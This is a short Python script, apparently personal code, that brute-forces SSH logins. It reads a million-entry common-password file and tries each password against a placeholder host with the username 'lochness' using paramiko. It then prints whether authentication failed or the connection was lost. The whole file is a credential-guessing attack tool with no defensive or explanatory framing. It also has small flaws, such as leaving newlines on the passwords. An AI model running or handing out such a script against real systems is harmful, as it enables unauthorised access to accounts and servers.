import paramiko, os, socket, sys, random

host="HOSTNAME OR IP"
username="lochness"
input_file="/users/prestonwillis/documents/python/10_million_password_list_top_1000000.txt"
lines = open(input_file,'r')
line = "\n-----------------------------------\n"
count=0




def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        print "Connected"
        os.system("ls")
    except paramiko.AuthenticationException:
        code = 1
        print "Auth Error"
    except socket.error, e:
        code = 2
        print "Connection Lost"
    return code
for password in lines:
    ssh_connect(password)
